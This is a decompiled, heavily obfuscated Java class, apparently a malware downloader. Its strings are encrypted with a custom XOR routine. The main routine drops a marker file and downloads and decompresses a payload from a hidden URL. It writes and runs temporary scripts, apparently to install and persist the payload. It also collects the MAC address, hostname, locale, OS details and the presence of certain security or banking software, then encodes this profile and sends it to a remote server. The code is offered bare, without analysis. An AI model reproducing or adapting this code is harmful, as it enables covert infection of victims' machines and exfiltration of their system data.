import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;
import java.util.Base64;
import java.util.Base64.Encoder;
import java.util.Locale;
import java.util.Random;
import java.util.zip.InflaterInputStream;

public class HOgx9bJeKIVjA
{
  private static String string0;
  private static String string1;
  private static String string2;
  private static String string3;
  private static String string4;
  private static String string5;
  private static String string6;
  private static String string7;
  private static String string8;
  private static long long0;
  private static String string9;
  
  public static String sfunc0(String string11)
    throws Exception
  {
    String string12 = "";
    if (string11.isEmpty()) {
      return string12;
    }
    int int0 = string0.length();
    int int1 = -1;
    int int2 = 0;
    int int3 = 0;
    int int4 = 0;
    int int5 = 0;
    
    int2 = Integer.parseInt(string11.substring(0, 2), 16);
    for (int3 = 2; int3 < string11.length(); int3 += 2)
    {
      int4 = Integer.parseInt(string11.substring(int3, int3 + 2), 16);
      if (int1 < int0 - 1) {
        int1++;
      } else {
        int1 = 0;
      }
      int5 = int4 ^ string0.charAt(int1);
      if (int5 <= int2) {
        int5 = 255 + int5 - int2;
      } else {
        int5 -= int2;
      }
      string12 = string12 + (char)int5;
      int2 = int4;
    }
    return string12;
  }
  
  public static String sfunc1(String string14)
    throws Exception
  {
    String string15 = "";
    if (string14.isEmpty()) {
      return string15;
    }
    int int6 = string0.length();
    int int7 = -1;
    int int8 = 0;
    int int9 = 0;
    int int10 = 0;
    int int11 = 256;
    
    Random rand0 = new Random();
    int8 = rand0.nextInt(int11 + 1);
    string15 = String.format(string9, new Object[] { Integer.valueOf(int8) });
    for (int9 = 0; int9 < string14.length(); int9++)
    {
      int10 = (string14.charAt(int9) + int8) % 255;
      if (int7 < int6 - 1) {
        int7++;
      } else {
        int7 = 0;
      }
      int10 ^= string0.charAt(int7);
      string15 = string15 + String.format(string9, new Object[] { Integer.valueOf(int10) });
      int8 = int10;
    }
    return string15;
  }
  
  public static boolean bool0(String string16)
    throws Exception
  {
    File file0 = new File(string16);
    boolean boolRes = file0.exists();
    return boolRes;
  }
  
  public static String sfunc2()
    throws Exception
  {
    String string18 = sfunc0("2252A5A3B3B1ADA4DD51D856F477F179FB34E37BAA78AB76A183A8");
    String string19 = sfunc0("5E8EC16E86A253EA62BD6BA44781DB73D13AC971808D61AD49BB43");
    String string20 = sfunc0("C5C7C8B0B0ACB8BFC676E5");
    String string21 = string18 + string19 + string20;
    
    Random rand1 = new Random();
    Random rand2 = new Random();
    int intTamanho = rand2.nextInt(10);
    String string22 = "";
    int intIndex = -1;
    for (int intCont = 0; intCont < intTamanho + 1; intCont++)
    {
      intIndex = rand1.nextInt(string21.length());
      string22 = string22 + string21.substring(intIndex, intIndex + 1);
    }
    return string22;
  }
  
  public static String sfunc3(String string24)
    throws Exception
  {
    String string25 = sfunc0("E50A6FFE78F9");
    String string26 = Base64.getEncoder().encodeToString(string24
      .getBytes(string25));
    return string26;
  }
  
  public static String sfunc4()
    throws Exception
  {
    String string28 = "";
    try
    {
      String string29 = sfunc0("F85A8EBE8AB27287C834172D2E4FA83D82888B4CA67087999A71AF40EA10D4153197977B9C4FC958BA6D888D60B91834E12F95934B89A043F4389938EF0D39F80EB07B8D75BE065FF4272FC0AC947BB969BA59D075EE");
      Process reader0 = Runtime.getRuntime().exec(string29);
      reader0.waitFor();
      
      BufferedReader reader0 = new BufferedReader(new InputStreamReader(reader0.getInputStream()));
      String string30;
      while ((string30 = reader0.readLine()) != null) {
        string28 = string28 + string30;
      }
      reader0.close();
      
      int intExitCodigo = reader0.exitValue();
      if (intExitCodigo != 0) {
        string28 = sfunc0("E161F328");
      } else if (string28.contains(sfunc0("2465EC56"))) {
        string28 = sfunc0("C7075983");
      } else {
        string28 = sfunc0("B61BB568");
      }
    }
    catch (Exception e)
    {
      string28 = sfunc0("17B427DD");
      e.printStackTrace();
    }
    return string28;
  }
  
  public static String sfunc5()
    throws Exception
  {
    String string32 = "";
    try
    {
      File file1 = File.createTempFile(sfunc0("B81EB26E83A050E374"), 
        sfunc0("5FBC022FF6"));
      file1.deleteOnExit();
      FileWriter writer0 = new FileWriter(file1, true);
      BufferedWriter writer1 = new BufferedWriter(writer0);
      
      writer1.write(sfunc0("0C6EE21C689E5B95D24E818AAF17B6EE1E47EF2EF620F1221E"));
      writer1.write(sfunc0("5FF06A84B361D3A5CD37D93EF157FF1656C25285917C82D195"));
      writer1.newLine();
      writer1.write(sfunc0("CE73D60211C96D8D32D07595E31400578B8CBF69B848D230F45AE80B20DA072AC50A3CE92FD0"));
      writer1.newLine();
      writer1.write(sfunc0("66E86C95BE7BBA7DAC9FFC1ED674F664EA1BEF2EFC53CD34F6102BDF1530"));
      writer1.newLine();
      writer1.write(sfunc0("92CA0F1B2BD1619F38DD11F1054C8F3A68DC994CC84DA57E"));
      writer1.newLine();
      writer1.write(sfunc0("C72ABE78CC758DA7DF24D034F226574FA473829D65B778AE4C0D5AE214C840C54A4B1E34"));
      writer1.write(sfunc0("C5D4CBA040FD2A3D9D7DAE569C379D8599C087FA59C556CA56C64F905BF60C2AD60EE57CDD"));
      writer1.newLine();
      writer1.write(sfunc0("E41AB860D453EE025B0D3FD36888CF0D4D1418CA8F868D82A660BA638BF3162ADD72B352BD"));
      writer1.newLine();
      writer1.write(sfunc0("79F36BC0648FA3A82DE4143028BC1EBBE95E1BC252BC779F6AA5B056E60623"));
      writer1.newLine();
      writer1.write(sfunc0("124A8C86BE6594538D77A8699C24A72270D4914AD937F9"));
      writer1.newLine();
      writer1.write(sfunc0("FB70EF1F6BFD3E"));
      writer1.newLine();
      writer1.write(sfunc0("C525BB7FA7"));
      writer1.newLine();
      writer1.write(sfunc0("047CD3B876A0BB70EC20CD45EE56FC66E821F65BCA4BD5313EEC152BC56582A79FD65EB25A"));
      writer1.write(sfunc0("B2E337E11FC5BD8DE326DA32046ED50141D321D96DCA4BC659005796AF5520"));
      writer1.close();
      writer0.close();
      
      Process reader1 = Runtime.getRuntime().exec(sfunc0("CB1EA04F95B772B6E761EC2E2CAE22A9FB67") + file1
        .getPath() + sfunc0("5748"));
      reader1.waitFor();
      BufferedReader reader1 = new BufferedReader(new InputStreamReader(reader1.getInputStream()));
      String string33 = "";
      while ((string33 = reader1.readLine()) != null) {
        string32 = string32 + string33;
      }
      reader1.close();
    }
    catch (Exception localException) {}
    return string32.trim();
  }
  
  public static String sfunc6()
    throws Exception
  {
    String string35 = "";
    try
    {
      InetAddress addr0 = InetAddress.getLocalHost();
      NetworkInterface interface0 = NetworkInterface.getByInetAddress(addr0);
      byte[] array2 = interface0.getHardwareAddress();
      
      StringBuilder builder0 = new StringBuilder();
      for (int i = 0; i < array2.length; i++) {
        builder0.append(String.format(sfunc0("3A6EAFAA5735F2"), new Object[] { Byte.valueOf(array2[i]), i < array2.length - 1 ? "-" : "" }));
      }
      string35 = builder0.toString();
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return string35.trim();
  }
  
  public static String sfunc7()
    throws Exception
  {
    String string37 = "";
    try
    {
      File file2 = File.createTempFile(sfunc0("FC58F02FF7102DC201"), 
        sfunc0("050249E000"));
      file2.deleteOnExit();
      FileWriter writer2 = new FileWriter(file2, true);
      BufferedWriter writer3 = new BufferedWriter(writer2);
      
      writer3.write(sfunc0("A8C6046FE01AD616B9AF41D41EA620BDEF47C90EE7"));
      writer3.newLine();
      writer3.write(sfunc0("125488B783BB44FE67C24FD060E76AEB7D9B9FAC66FE590C"));
      writer3.write(sfunc0("2D459B5BFE28C87ED0331848E966E076EF24FD3D12161730E32FEB0824CA49FF29AC7B907DB28F9571A64DD998AA"));
      writer3.newLine();
      writer3.write(sfunc0("8FD30837032FC4619B668887ACF9031BB862A94DFF31E132CB3BD16693B8AE54C8"));
      writer3.write(sfunc0("D32891BD758F5F9436D9411132A23B98C9470260E534C346DC85B371BD6D94AC55F8082CE6120CE031E64817"));
      writer3.newLine();
      writer3.write(sfunc0("B3C8093004003BCE0650FC2DC136903D94939940D03CE929F725EF002C0618D7BD13E6270838E734D2"));
      writer3.newLine();
      writer3.write(sfunc0("E76AEF29D90A27C70510CA6B9A3D968EF963EE12110321FA0010132F"));
      writer3.write(sfunc0("87C80FC94E89A257FD17C884BE1DA42DAB74889A9E74BC90"));
      writer3.newLine();
      writer3.write(sfunc0("E601563DE410D86DE72DDE39CC73F56FEE2D2828035B184F002DE015DB"));
      writer3.newLine();
      writer3.write(sfunc0("BC2549E70E3EF43956ED12082174D370D04CD0081DF136DA46DE39CD"));
      writer3.newLine();
      writer3.write(sfunc0("4EA220CFBB4CE8"));
      writer3.newLine();
      writer3.write(sfunc0("6E8DC377BF"));
      writer3.newLine();
      writer3.write(sfunc0("2DB126D1A55CE41F47E26FB04087C90B5CB87DF22C2623155AD84BEC648CA156F35AE6"));
      writer3.write(sfunc0("0F0046E4073DFE3C8182FF2EDC3EAE19BA53A2B263B0719369AB559DB854955B8ACE65F365"));
      writer3.newLine();
      writer3.write(sfunc0("D91CB06EDA77BC79F31EC05C99FE2B5042C84EF4290E32F039D23CF6022DDB4CE829330CFC26F3"));
      writer3.write(sfunc0("519338D61DDF522446DD091C29A8FC1F0D0A19C4570F35D624F43EF43FFE2524DC7E868F8ABAA6AE"));
      writer3.newLine();
      writer3.write(sfunc0("7CF3528FFB0833C61E48F425D92EA825BC6AB665BF4BFE041CF91A2EFA67D04BF326ED29ED739D62BA6DDE"));
      writer3.newLine();
      writer3.write(sfunc0("25A92FEA1BCD1BDB79AC65C175D7090311373216E03BC0778A8785"));
      writer3.write(sfunc0("6BF06B96588288AA2BF92CFD2463A532A964B152D6281301011F3D"));
      writer3.newLine();
      writer3.write(sfunc0("639D351EC573BF74EC16C540F744A630AF6CFB50E95015420B52D36F8CB0"));
      writer3.newLine();
      writer3.write(sfunc0("74FA7FA948F833F7172ACE45E2369D2AAE6AB666B358DC231E06063832"));
      writer3.newLine();
      writer3.write(sfunc0("EE0542ED5AEA0B"));
      writer3.newLine();
      writer3.write(sfunc0("93D00734FC"));
      writer3.close();
      writer2.close();
      
      Process reader2 = Runtime.getRuntime().exec(sfunc0("0254F611D70822C6D771FC1E3C9E32998BD4") + file2
        .getPath() + sfunc0("297A"));
      reader2.waitFor();
      BufferedReader reader2 = new BufferedReader(new InputStreamReader(reader2.getInputStream()));
      String string38 = "";
      while ((string38 = reader2.readLine()) != null) {
        if (string37.isEmpty()) {
          string37 = string37 + string38;
        } else {
          string37 = string37 + sfunc0("5544F159") + string38;
        }
      }
      reader2.close();
    }
    catch (Exception localException) {}
    return string37.trim();
  }
  
  public static String sfunc8()
    throws Exception
  {
    String string40 = new String(InetAddress.getLocalHost().getHostName());
    return string40.toUpperCase();
  }
  
  public static String sfunc9()
    throws Exception
  {
    String string42 = "";
    Locale locale0 = Locale.getDefault();
    String string43 = locale0.getCountry().toLowerCase();
    String string44 = locale0.getDisplayCountry().toLowerCase();
    String string45 = locale0.getLanguage().toLowerCase();
    
    string42 = string44 + sfunc0("71A0") + string45 + sfunc0("C2DE") + string43;
    return string42;
  }
  
  private static String sfunc10(File[] array4)
    throws Exception
  {
    String string47 = "";
    File[] arrArquivosGPC = array4;
    int j = array4.length;
    for (int i = 0; i < j; i++)
    {
      File file3 = arrArquivosGPC[i];
      String string48 = String.valueOf(file3);
      String[] array6 = string48.split(sfunc0("36A331"));
      String strTemp = array6[(array6.length - 1)];
      int intTemp = strTemp.indexOf(sfunc0("0A09"));
      strTemp = strTemp.substring(0, intTemp);
      if (string47.isEmpty()) {
        string47 = string47 + strTemp;
      } else {
        string47 = string47 + sfunc0("FC2C99F2") + strTemp;
      }
    }
    return string47;
  }
  
  private static File[] arrayFunc0(String string50, String string51)
    throws Exception
  {
    File file4 = new File(string50);
    FileFilter file4Filter = null;
    if (string51 != null) {
      file4Filter = new FileFilter()
      {
        public boolean accept(File objArquivo)
        {
          return objArquivo.getAbsolutePath().endsWith(this.val$string51);
        }
      };
    }
    return file4.listFiles(file4Filter);
  }
  
  public static String sfunc11()
    throws Exception
  {
    String string53 = "";
    String string54 = "";
    String string55 = "";
    String string56 = "";
    String string57 = "";
    
    string54 = System.getenv(sfunc0("74F55983BE7883A0D737E034F12FB3D33818"));
    if (string54 != null) {
      string53 = System.getenv(sfunc0("BF21A259944EF53348C777AE74A93656BE9E")) + sfunc0("026F87A2A65A95AC27E303");
    } else {
      string53 = System.getenv(sfunc0("B0309348FB27D21067A650C76D")) + sfunc0("F66298B1568B5B92CA4FE8");
    }
    if (bool0(string53)) {
      string57 = sfunc10(arrayFunc0(string53, sfunc0("3D5AF02AD9"))).toUpperCase();
    } else {
      string57 = "";
    }
    if (string54 != null)
    {
      string55 = string54 + sfunc0("42AFC179BD49E11346D4");
      if (bool0(string55)) {
        if (string57.isEmpty()) {
          string57 = sfunc0("89FB5D869C46FD32");
        } else {
          string57 = string57 + sfunc0("EF21AC879C44EE61E232D5");
        }
      }
    }
    else
    {
      string55 = System.getenv(sfunc0("49A82AD26EA951EE041BC4589D")) + sfunc0("E87484BF64EF38C91F0D");
      if (bool0(string55)) {
        if (string57.isEmpty()) {
          string57 = sfunc0("6D9F21DA49F20E22");
        } else {
          string57 = string57 + sfunc0("9283311A0F36FC6FD044EB");
        }
      }
    }
    if (string54 != null)
    {
      string56 = string54 + sfunc0("B23E80A84DE60334A970");
      if (bool0(string56)) {
        if (string57.isEmpty()) {
          string57 = sfunc0("45B61832C2");
        } else {
          string57 = string57 + sfunc0("8A9B290210CB778B");
        }
      }
    }
    else
    {
      string56 = System.getenv(sfunc0("B232954EE11D24C139D40215DE")) + sfunc0("FE6AEC1BDF0B27D80C1E");
      if (bool0(string56)) {
        if (string57.isEmpty()) {
          string57 = sfunc0("A0D37793A3");
        } else {
          string57 = string57 + sfunc0("CEDF6DC65D86BD72");
        }
      }
    }
    return string57;
  }
  
  public static String sfunc12()
    throws Exception
  {
    String string59 = "";
    string59 = System.getProperty(sfunc0("83C90C3AF86E86B7140F"));
    return string59;
  }
  
  public static String sfunc13()
    throws Exception
  {
    String string61 = "";
    String string62 = "";
    String string63 = "";
    
    string61 = System.getProperty(sfunc0("054589FC3FE90D22"));
    
    string62 = System.getenv(sfunc0("2C4DAEB6ADBB55F879BD5EED166C80F174C061F92A042C"));
    string63 = System.getenv(sfunc0("5C9DDE65FC0B040767CF6CDF6492EE0066D24FC998B380"));
    
    string61 = string61 + ((string62.endsWith(sfunc0("5BA0E5"))) || ((string63 != null) && (string63.endsWith(sfunc0("5BA0E5")))) ? sfunc0("D1C8CF4F2C") : sfunc0("7A93F761DE"));
    return string61;
  }
  
  public static void vfunc0(String string64)
    throws Exception
  {
    URL url0 = new URL(string64);
    HttpURLConnection connect0 = (HttpURLConnection)url0.openConnection();
    connect0.setRequestMethod(sfunc0("2B43B945"));
    connect0.setRequestProperty(sfunc0("AB3092BC7BE179B027E31B"), 
      sfunc0("34B011C07EA34AFB1A392426"));
    connect0.setDoOutput(true);
    
    int int20 = connect0.getResponseCode();
    if (int20 == 200)
    {
      BufferedReader reader3 = new BufferedReader(new InputStreamReader(connect0.getInputStream()));
      
      StringBuffer buffer0 = new StringBuffer();
      String string65;
      while ((string65 = reader3.readLine()) != null) {
        buffer0.append(string65);
      }
      reader3.close();
      
      System.out.println(buffer0.toString());
    }
  }
  
  public static void vfunc1(String string66, String string67)
    throws Exception
  {
    try
    {
      long0 = 0L;
      URL url1 = new URL(string66);
      ReadableByteChannel channel0 = Channels.newChannel(url1.openStream());
      FileOutputStream stream0 = new FileOutputStream(string67);
      stream0.getChannel().transferFrom(channel0, 0L, Long.MAX_VALUE);
      long0 = stream0.getChannel().size();
      stream0.close();
      channel0.close();
    }
    catch (IOException objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static void vfunc2(String string68, String string69)
    throws Exception
  {
    FileInputStream stream1 = new FileInputStream(string68);
    FileOutputStream stream2 = new FileOutputStream(string69);
    InflaterInputStream stream3 = new InflaterInputStream(stream1);
    
    int int21 = 0;
    while ((int21 = stream3.read()) != -1) {
      stream2.write(int21);
    }
    stream3.close();
    stream2.close();
    stream1.close();
  }
  
  public static void vfunc3()
    throws Exception
  {
    String string70 = "";
    
    string70 = string70 + sfunc9() + sfunc0("1F7A");
    string70 = string70 + sfunc6() + sfunc0("237E");
    string70 = string70 + sfunc8() + sfunc0("A1FC");
    string70 = string70 + sfunc12() + sfunc0("100D");
    string70 = string70 + sfunc13() + sfunc0("DA36");
    string70 = string70 + string1 + sfunc0("DD3B");
    string70 = string70 + sfunc4() + sfunc0("DD3B");
    string70 = string70 + sfunc5() + sfunc0("E13F");
    string70 = string70 + sfunc7() + sfunc0("011C");
    string70 = string70 + sfunc11() + sfunc0("5BB6");
    string70 = string70 + long0;
    
    string70 = String.format(sfunc0("8498F967EB"), new Object[] { Integer.valueOf(string0.length()) }) + string0 + sfunc1(string70);
    string70 = sfunc3(string70);
    string70 = sfunc2() + sfunc0("0672") + string70;
    
    vfunc0(string3 + sfunc0("95E5") + string70);
  }
  
  public static void vfunc4()
    throws Exception
  {
    Process reader3 = Runtime.getRuntime().exec(
      sfunc0("02449D5898B57FA624321CFC4B4DF52E53FA7EE72E3633011AF62DCA6CAC5996B01224262C"));
    reader3.waitFor();
  }
  
  public static void vfunc5()
    throws Exception
  {
    FileWriter writer4 = new FileWriter(new File(string8));
    writer4.close();
  }
  
  public static void vfunc6(String string71)
  {
    try
    {
      File file5 = File.createTempFile(sfunc0("E67BDC0D3AD46C8B"), 
        sfunc0("415EE50322"));
      file5.deleteOnExit();
      FileWriter writer5 = new FileWriter(file5, true);
      BufferedWriter writer6 = new BufferedWriter(writer5);
      
      writer6.write(sfunc0("0B7ED60F7BA3B35797"));
      writer6.newLine();
      writer6.write(sfunc0("2042964034EA6BEE0F59D5879C3AAB359B78A249D644C242055EC47B"));
      writer6.write(sfunc0("1EA13AE10222CA62A191B954EF76DB77D946D66AA96CB46D8EC987"));
      writer6.newLine();
      writer6.write(sfunc0("2EACC35CFF67F033A97DB26AE663FB588F7BFE6D"));
      writer6.write(string71 + sfunc0("7E91"));
      writer6.newLine();
      writer6.close();
      writer5.close();
      Process reader4 = Runtime.getRuntime().exec(sfunc0("AE23A740E619D318094EDF3DDF7AD57DAFA8") + file5
        .getPath() + sfunc0("E93D"));
      reader4.waitFor();
    }
    catch (Exception objExecessao)
    {
      objExecessao.printStackTrace();
    }
  }
  
  public static void vfunc7(String string72, String string73, String string74)
    throws Exception
  {
    try
    {
      File file6 = new File(string72);
      FileWriter writer7 = new FileWriter(file6);
      BufferedWriter writer8 = new BufferedWriter(writer7);
      
      String string75 = string73;
      String[] array9 = string75.split(sfunc0("66F361"));
      
      writer8.write(sfunc0("93E27997548AF030A778"));
      writer8.newLine();
      writer8.write(array9[0]);
      writer8.newLine();
      writer8.write(sfunc0("2DA1371C2C"));
      writer8.newLine();
      for (int i = 1; i < array9.length - 1; i++)
      {
        writer8.write(sfunc0("F76AFF6B") + array9[i]);
        writer8.newLine();
      }
      writer8.write(sfunc0("3FA0C458C85CF27699CF"));
      writer8.write(array9[(array9.length - 1)]);
      writer8.write(sfunc0("4D48"));
      writer8.write(string74);
      writer8.close();
      writer7.close();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static String sfunc14()
    throws Exception
  {
    String string77 = "";
    String string78 = "";
    try
    {
      string78 = sfunc0("086AEF1AD80423C3");
      File file7 = File.createTempFile(sfunc0("C5075D8FA440F336986494"), 
        sfunc0("EB2B90B979"));
      file7.deleteOnExit();
      FileWriter writer9 = new FileWriter(file7);
      BufferedWriter writer10 = new BufferedWriter(writer9);
      
      writer10.write(sfunc0("23479D592DCD1BD316082EE8031667BF2501013FCD46DF7B"));
      writer10.write(sfunc0("FF72D57085B04CCB1FFF26FB267BA939BE5BA85EAB58E342C552CB6BD5B4"));
      writer10.newLine();
      
      writer10.write(sfunc0("C20B4FF938E8032764BF60BA7CA93590CA67AA5CAD62F5"));
      writer10.write(sfunc0("F174D57087B941FD7592BD50E363E23367"));
      writer10.write(string78);
      writer10.write(sfunc0("FD110B"));
      writer10.newLine();
      writer10.write(sfunc0("9FC318C7B342CF48AA658987A5F01A0262A878AC739964"));
      writer10.close();
      writer9.close();
      
      Process reader5 = Runtime.getRuntime().exec(sfunc0("7DD1749C5B8DA74C5DFA0A0B0145983062FD") + file7
        .getPath() + sfunc0("BBEC"));
      reader5.waitFor();
      
      BufferedReader reader4 = new BufferedReader(new InputStreamReader(reader5.getInputStream()));
      
      String string79 = "";
      while ((string79 = reader4.readLine()) != null) {
        string77 = string77 + string79;
      }
      reader4.close();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
    return string77;
  }
  
  public static void vfunc8(String string80, String string81)
    throws Exception
  {
    String string82 = sfunc14() + sfunc0("BD2B") + string81 + sfunc0("F02EAB51E8");
    try
    {
      File file8 = File.createTempFile(sfunc0("5A8CCF7E8B49F431AE6C"), 
        sfunc0("1774DB75BC"));
      file8.deleteOnExit();
      FileWriter writer11 = new FileWriter(file8);
      BufferedWriter writer12 = new BufferedWriter(writer11);
      
      writer12.write(sfunc0("105286B1859553EB0E0026E01B0E7FA7CC59D9000C041D3E"));
      writer12.write(sfunc0("E217B855E21ED979EA23CB5D879A88E70915E20015F145ED39E721DE59C8"));
      writer12.newLine();
      
      writer12.write(sfunc0("98DA71AE9A4EE6021326052EF7559C3D9085948E"));
      writer12.write(sfunc0("7FF357F70DC8749731D60A0C399B2474A4"));
      writer12.write(string82);
      writer12.write(sfunc0("1A0D07"));
      writer12.newLine();
      
      writer12.write(sfunc0("4D88C778F20E35F76EA559DB6BEA67BFCE97DC"));
      writer12.write(string80);
      writer12.write(sfunc0("8699"));
      writer12.newLine();
      writer12.write(sfunc0("9C3897482223C86D899851031603116A84A1A9A0919B82D84611"));
      writer12.newLine();
      writer12.write(sfunc0("DF7DDA0D6F8FA2419472AA8F52FE5FFC2F15503E0A54"));
      writer12.newLine();
      
      writer12.write(sfunc0("035EFD22041E25CB00"));
      writer12.newLine();
      writer12.write(sfunc0("7AFC538CF82CC07CAD9CFF3CFD479B3D9978"));
      writer12.newLine();
      writer12.close();
      writer11.close();
      
      Process reader6 = Runtime.getRuntime().exec(sfunc0("194DF11EC4678D52430411F269ED61E83B24") + file8
        .getPath() + sfunc0("4556"));
      reader6.waitFor();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static void main(String[] args)
    throws Exception
  {
    string0 = "11KTIZP1vCrV5482yeLexeuoyuSXJWQJ2dtxDzauCAfck4ICy0iM7RSEi";
    char[] array11 = { '%', '0', '2', 'X' };
    string9 = new String(array11);
    string1 = sfunc0("8A8D8C8A");
    string3 = sfunc0("A23A9F5F9B9C9190F053CF8F92FD187198A9B2A8BC88D24CD740C3608ABB798FBE1F29ED2EDA");
    
    String string83 = System.getenv(sfunc0("394BAAB1A1AB5ACB"));
    
    string8 = string83 + sfunc0("4792EE1322DD17DA7B974FD9");
    string8 += sfunc0("C115BC64C67AB34B");
    if (!bool0(string8))
    {
      vfunc5();
      
      string4 = string83 + sfunc0("F765") + sfunc2() + sfunc0("E470");
      vfunc6(string4);
      
      string2 = sfunc0("78D177A045363F3E5EE45DF9799AFC167DCC9F9DAB9BAF56A36FA241EC2BF633EC29F42AE8");
      string5 = sfunc0("A227AC54E811DE0348C57ADA14489A");
      string6 = sfunc0("CE73D8003CE20CD0769748043E9F38");
      string7 = sfunc0("126989F170F36DF0132937193CB4");
      
      vfunc1(string2, string4 + string5);
      
      vfunc2(string4 + string5, string4 + string6);
      
      String string84 = string4 + sfunc2() + sfunc0("C9C61BC37C");
      
      vfunc7(string84, string4 + string6, string7);
      
      String string85 = string6.replace(sfunc0("38578ABD7E"), "");
      
      vfunc8(string84, string85);
      try
      {
        vfunc3();
      }
      catch (Exception localException) {}
      vfunc4();
    }
  }
}
